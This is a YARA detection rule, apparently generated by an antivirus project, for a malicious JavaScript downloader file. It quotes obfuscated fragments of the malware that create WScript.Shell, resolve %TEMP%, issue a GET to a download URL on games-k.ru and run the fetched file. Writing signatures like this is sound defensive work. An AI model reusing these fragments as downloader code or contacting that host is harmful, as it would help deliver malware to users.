rule sig_20160427_7080a4ba6d02b2cba4834f499fc70eae {
  meta:
    description = "datamaliciousorder - file 20160427_7080a4ba6d02b2cba4834f499fc70eae.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cd9b7db514202035fa113f3138ce5c18a0f9bd37dfc98e7877424c08bf526825"

  strings:
    $s1  = "function InkpqNumbn() {return BhnddStugi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"2Ir8yBV" ascii
    $s2  = "function InkpqNumbn() {return BhnddStugi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"2Ir8yBV" ascii
    $s3  = "function MyrkyNahkv(KkgkuMuqam, ZthrcPurit){KtovtInkrv = KtovtInkrv * 1; return KkgkuMuqam - ZthrcPurit;};" fullword ascii
    $s4  = "var BhnddStugi = function AbemdVvidb() {return PlksjXkhgz[VpzomEfpuq](\"WScript\"+\".Shell\");}(), SmneuMldzr = 11;" fullword ascii
    $s5  = "MrdblUvbaf[HzhpoHkhxi](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s6  = "var PlksjXkhgz = this[\"WScript\"];" fullword ascii
    $s7  = "function MasvvLheyv(){return HfkssPuvdg + \"\";};" fullword ascii
    $s8  = "if (MrdblUvbaf[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function JwfkuXxqdw() {return ((ZqywlFgfrb == true) && (ZqywlFgfrb == LseifPthqd)) ? 1 : KtovtInkrv;};" fullword ascii
    $s10 = "var OcwhnIhrmb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "}while (RqqjhLahed);" fullword ascii
    $s12 = "LseifPthqd = true; " fullword ascii
    $s13 = "function CwzuzVtioi()" fullword ascii
    $s14 = "ZqywlFgfrb = true; " fullword ascii
    $s15 = "return MyrkyNahkv(XxzqbSbjnu, GgiytCjckn);" fullword ascii
    $s16 = "var ZqywlFgfrb = false;" fullword ascii
    $s17 = "var LseifPthqd = false;" fullword ascii
    $s18 = "function VhoapFwngk(GlxqqMntdk){BhnddStugi[\"R\"+\"un\"](GlxqqMntdk, KtovtInkrv, KtovtInkrv);};" fullword ascii
    $s19 = "LzkibMwnct = true;" fullword ascii
    $s20 = "function IxchxUybos(){return VpzomEfpuq;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}